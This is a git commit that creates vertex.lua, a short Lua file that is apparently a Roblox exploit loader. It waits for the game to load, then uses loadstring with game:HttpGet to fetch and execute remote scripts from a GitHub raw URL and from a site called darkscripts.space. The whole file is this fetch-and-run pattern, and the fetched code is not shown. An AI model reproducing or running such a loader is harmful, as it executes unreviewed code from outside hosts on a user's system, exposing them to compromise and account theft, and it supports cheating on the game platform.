6e2b7515ee77e6ba1b7f4249562dc252b8612b79
m.better <ppro07570@gmail.com>
2024-12-30 13:41:14 +0700

    Create vertex.lua

---
+++ vertex.lua
@@ -0,0 +1,5 @@
+repeat task.wait() until game:IsLoaded()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+
+loadstring(game:HttpGet('https://darkscripts.space/scripts/0afa3774-0397-405b-bd69-b06ec966a061_1153958110386475048.lua',true))()
